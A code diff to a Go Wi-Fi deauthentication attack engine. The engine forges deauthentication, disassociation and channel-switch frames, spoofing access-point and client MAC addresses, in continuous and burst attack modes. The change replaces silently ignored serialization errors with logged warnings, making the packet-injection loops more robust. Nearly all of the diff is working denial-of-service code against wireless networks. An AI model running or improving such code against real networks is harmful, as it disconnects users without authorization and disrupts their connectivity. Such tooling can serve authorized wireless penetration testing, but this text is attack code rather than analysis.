@@ -623,13 +623,15 @@ func (e *DeauthEngine) runContinuousAttack(ctx context.Context, controller *Atta
 			case domain.DeauthBroadcast:
 				var pkt []byte
 				if useCSA {
-					pkt, _ = injection.SerializeCSAPacket(targetMAC, txMAC_AP, 1, 0, seq)
+					pkt, err = injection.SerializeCSAPacket(targetMAC, txMAC_AP, 1, 0, seq)
 				} else if useDisassoc {
-					pkt, _ = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
+					pkt, err = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
 				} else {
-					pkt, _ = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
+					pkt, err = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
 				}
-				if pkt != nil {
+				if err != nil {
+					e.log(fmt.Sprintf("Failed to serialize packet: %v", err), "warning")
+				} else if pkt != nil {
 					pkts = append(pkts, pkt)
 				}
 
@@ -637,13 +639,15 @@ func (e *DeauthEngine) runContinuousAttack(ctx context.Context, controller *Atta
 				if len(clientMAC) > 0 {
 					var pkt []byte
 					if useCSA {
-						pkt, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
+						pkt, err = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
 					} else if useDisassoc {
-						pkt, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+						pkt, err = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 					} else {
-						pkt, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+						pkt, err = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 					}
-					if pkt != nil {
+					if err != nil {
+						e.log(fmt.Sprintf("Failed to serialize packet: %v", err), "warning")
+					} else if pkt != nil {
 						pkts = append(pkts, pkt)
 					}
 				}
@@ -653,31 +657,40 @@ func (e *DeauthEngine) runContinuousAttack(ctx context.Context, controller *Atta
 					// 1. AP -> Client
 					var pkt1 []byte
 					if useCSA {
-						pkt1, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
+						pkt1, err = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
 					} else if useDisassoc {
-						pkt1, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+						pkt1, err = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 					} else {
-						pkt1, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
-					}
-					seq++ // Increment for next packet
-
-					// 2. Client -> AP
-					reasonClientToAP := currentReason
-					if config.UseReasonFuzzing || config.ReasonCode == 0 {
-						reasonClientToAP = 3 // Station Leaving
-					}
-					var pkt2 []byte
-					if useDisassoc {
-						pkt2, _ = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
-					} else {
-						pkt2, _ = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+						pkt1, err = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 					}
 
-					if pkt1 != nil {
-						pkts = append(pkts, pkt1)
-					}
-					if pkt2 != nil {
-						pkts = append(pkts, pkt2)
+					if err != nil {
+						e.log(fmt.Sprintf("Failed to serialize packet 1: %v", err), "warning")
+					} else {
+						seq++ // Increment for next packet
+
+						// 2. Client -> AP
+						reasonClientToAP := currentReason
+						if config.UseReasonFuzzing || config.ReasonCode == 0 {
+							reasonClientToAP = 3 // Station Leaving
+						}
+						var pkt2 []byte
+						if useDisassoc {
+							pkt2, err = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+						} else {
+							pkt2, err = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+						}
+
+						if err != nil {
+							e.log(fmt.Sprintf("Failed to serialize packet 2: %v", err), "warning")
+						} else {
+							if pkt1 != nil {
+								pkts = append(pkts, pkt1)
+							}
+							if pkt2 != nil {
+								pkts = append(pkts, pkt2)
+							}
+						}
 					}
 				}
 			}
@@ -784,13 +797,15 @@ func (e *DeauthEngine) runBurstAttack(ctx context.Context, controller *AttackCon
 			var pkt []byte
 			if useCSA {
 				// Broadcast CSA
-				pkt, _ = injection.SerializeCSAPacket(broadcast, txMAC_AP, 1, 0, seq)
+				pkt, err = injection.SerializeCSAPacket(broadcast, txMAC_AP, 1, 0, seq)
 			} else if useDisassoc {
-				pkt, _ = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
+				pkt, err = injection.SerializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
 			} else {
-				pkt, _ = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
+				pkt, err = injection.SerializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, seq)
 			}
-			if pkt != nil {
+			if err != nil {
+				e.log(fmt.Sprintf("Failed to serialize packet: %v", err), "warning")
+			} else if pkt != nil {
 				pkts = append(pkts, pkt)
 			}
 
@@ -798,13 +813,15 @@ func (e *DeauthEngine) runBurstAttack(ctx context.Context, controller *AttackCon
 			if len(clientMAC) > 0 {
 				var pkt []byte
 				if useCSA {
-					pkt, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
+					pkt, err = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
 				} else if useDisassoc {
-					pkt, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+					pkt, err = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 				} else {
-					pkt, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+					pkt, err = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 				}
-				if pkt != nil {
+				if err != nil {
+					e.log(fmt.Sprintf("Failed to serialize packet: %v", err), "warning")
+				} else if pkt != nil {
 					pkts = append(pkts, pkt)
 				}
 			}
@@ -813,30 +830,39 @@ func (e *DeauthEngine) runBurstAttack(ctx context.Context, controller *AttackCon
 			if len(clientMAC) > 0 {
 				var pkt1 []byte
 				if useCSA {
-					pkt1, _ = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
+					pkt1, err = injection.SerializeCSAPacket(clientMAC, txMAC_AP, 1, 0, seq)
 				} else if useDisassoc {
-					pkt1, _ = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
+					pkt1, err = injection.SerializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 				} else {
-					pkt1, _ = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
-				}
-				seq++
-
-				reasonClientToAP := currentReason
-				if config.UseReasonFuzzing || config.ReasonCode == 0 {
-					reasonClientToAP = 3
-				}
-				var pkt2 []byte
-				if useDisassoc {
-					pkt2, _ = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
-				} else {
-					pkt2, _ = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+					pkt1, err = injection.SerializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, seq)
 				}
 
-				if pkt1 != nil {
-					pkts = append(pkts, pkt1)
-				}
-				if pkt2 != nil {
-					pkts = append(pkts, pkt2)
+				if err != nil {
+					e.log(fmt.Sprintf("Failed to serialize packet 1: %v", err), "warning")
+				} else {
+					seq++
+
+					reasonClientToAP := currentReason
+					if config.UseReasonFuzzing || config.ReasonCode == 0 {
+						reasonClientToAP = 3
+					}
+					var pkt2 []byte
+					if useDisassoc {
+						pkt2, err = injection.SerializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+					} else {
+						pkt2, err = injection.SerializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, reasonClientToAP, seq)
+					}
+
+					if err != nil {
+						e.log(fmt.Sprintf("Failed to serialize packet 2: %v", err), "warning")
+					} else {
+						if pkt1 != nil {
+							pkts = append(pkts, pkt1)
+						}
+						if pkt2 != nil {
+							pkts = append(pkts, pkt2)
+						}
+					}
 				}
 			}
 		}
